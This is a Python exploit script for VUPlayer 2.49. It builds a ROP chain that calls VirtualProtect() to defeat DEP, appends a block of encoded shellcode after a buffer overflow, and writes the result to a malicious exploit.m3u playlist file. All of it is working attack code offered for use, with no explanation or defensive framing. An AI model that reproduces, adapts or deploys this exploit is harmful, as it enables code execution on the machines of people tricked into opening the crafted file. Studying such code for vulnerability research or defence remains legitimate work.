#vuplayer 2.49 ROP DEP Bypass virtualprotect() exploit 
import struct

#----------------------------------------#
# ROP Chain setup for VirtualProtect()   #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = lpOldProtect (ptr to W address)  #
# EDX = NewProtect (0x40)                #
# EBX = dwSize                           #
# ESP = lPAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        #
# ESI = ptr to VirtualProtect()          #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

p32 = lambda x: struct.pack("I", x)

rop =  p32(0x10015f82) # POP EAX # RETN
rop += p32(0x10109270) # kernel32.virtualprotect 
rop += p32(0x1001eaf1) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += p32(0x10030950) # XCHG EAX,ESI # RETN
rop += p32(0x10015f82) # POP EAX # RETN
rop += p32(0xffffffc0) # NEG TO 0x40
rop += p32(0x10014db4) # NEG EAX # RETN
rop += p32(0x10038a6d) # XCHG EAX,EDX # RETN
rop += p32(0x10015f82) # POP EAX # RETN
rop += p32(0xfffffdff) # NEG TO 0x201
rop += p32(0x10014db4) # NEG EAX # RETN
rop += p32(0x10032f32) # XCHG EAX,EBX # RETN 0x00
rop += p32(0x106053e5) # POP ECX # RETN
rop += p32(0x011f99e0) # writable address
rop += p32(0x10605ce4) # POP EBP # RETN
rop += p32(0x3e085197) # jmp esp
rop += p32(0x10603658) # POP EDI # RETN 
rop += p32(0x7c82ffa2) # RETN NOP
rop += p32(0x10015f82) # POP EAX # RETN
rop += p32(0x90909090) # NOP
rop += p32(0x1001d7a5) # PUSHAD # RETN    

shellcode = shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

p = "HTTP://"
p += "A" * 1005
p += rop
p += "\x90" * 20
p += shellcode
p += "C" * (1500 - 1005 - len(shellcode) - 20)
try:
    print "[!] Creating exploit file!"
    open("exploit.m3u","wb").write(p)
    print "[+] Exploit file created at : .\exploit.m3u"
except:
    print "[-] Error attempting to create exploit file"
